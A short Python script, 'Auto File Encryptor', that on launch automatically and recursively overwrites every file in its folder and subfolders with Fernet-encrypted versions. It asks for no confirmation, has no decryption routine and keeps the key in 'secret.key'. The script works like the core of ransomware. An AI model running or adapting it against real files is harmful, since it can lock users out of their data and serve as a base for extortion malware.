import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# Generate or load encryption key
def get_or_create_key():
    key_file = "secret.key"
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
    return open(key_file, "rb").read()

# Encrypt a single file
def encrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)
        return f"[+] Encrypted: {file_path}"
    except Exception as e:
        return f"[!] Failed to encrypt {file_path}: {e}"

# Encrypt all files in current directory and subfolders
def encrypt_directory(base_path, fernet, output_box):
    for root, _, files in os.walk(base_path):
        for filename in files:
            if filename in ("secret.key", os.path.basename(__file__)):
                continue
            file_path = os.path.join(root, filename)
            result = encrypt_file(file_path, fernet)
            output_box.insert(tk.END, result)

# GUI setup
def start_gui():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    key = get_or_create_key()
    fernet = Fernet(key)

    root = tk.Tk()
    root.title("Auto File Encryptor")
    output_box = tk.Listbox(root, width=80, height=15)
    output_box.pack(padx=10, pady=10)

    encrypt_directory(current_dir, fernet, output_box)

    messagebox.showinfo("Done", "All files encrypted.")
    root.mainloop()

if __name__ == "__main__":
    start_gui()
